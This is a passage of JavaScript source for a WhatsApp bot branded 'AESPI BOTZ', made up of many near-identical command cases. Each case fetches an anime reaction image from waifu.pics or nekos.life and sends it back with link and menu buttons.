                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeyeet':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebite':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animelick':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekill':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecry':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewlp':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animekiss':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehug':{
await aespispStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeneko':{
await aespispStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
